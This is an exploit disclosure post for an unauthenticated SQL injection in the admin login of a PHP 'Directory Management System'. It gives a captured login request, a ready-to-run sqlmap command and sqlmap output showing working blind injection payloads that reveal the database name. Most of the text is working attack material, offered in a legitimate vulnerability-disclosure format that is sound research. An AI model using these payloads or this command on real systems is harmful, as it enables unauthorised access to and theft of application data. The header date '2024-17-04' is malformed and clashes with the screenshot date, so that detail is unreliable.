# Directory Management System - SQL Injection - 1 (Unauthenticated)
+ **Exploit Title:** Directory Management System - SQL Injection - 1 (Unauthenticated)
+ **Date:** 2024-17-04
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://phpgurukul.com/directory-management-system-using-php-and-mysql/
+ **Software Link:** https://phpgurukul.com/?sdm_process_download=1&download_id=9346
+ **Version:** Latest
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Directory Management System allows SQL Injection via the 'username' parameter at "http://localhost/dms/admin/index.php". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/dms/admin/index.php"
+ Try logging in by typing random things
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:

```
POST /dms/admin/ HTTP/1.1
Host: localhost
Content-Length: 39
Cache-Control: max-age=0
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/dms/admin/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: language=en; continueCode=5vLeVxlRzkNb47vKDPMo5Lq8wdzLtvf1Hem0jn6EZm2ygrX19BpaQWOJY3oM; welcomebanner_status=dismiss; cookieconsent_status=dismiss; PHPSESSID=cc12r4c7k38a4endfa1btuk5he
Connection: close

username=test&password=test&login=login

```

+ Use sqlmap to exploit. In sqlmap, use 'username' parameter to dump the database.
```
sqlmap -r r.txt -p username --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=test' OR NOT 7317=7317-- tNGi&password=test&login=login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 5819 FROM (SELECT(SLEEP(5)))LSok)-- rSbX&password=test&login=login
---
[20:05:30] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[20:05:30] [INFO] fetching current database          
current database: 'dmsdb'

```
+ current database: `dmsdb`

![Ekran görüntüsü 2024-05-19 181035](https://github.com/BurakSevben/CVEs/assets/117217689/df7c73bb-9645-44be-b45a-7c86d4c18267)
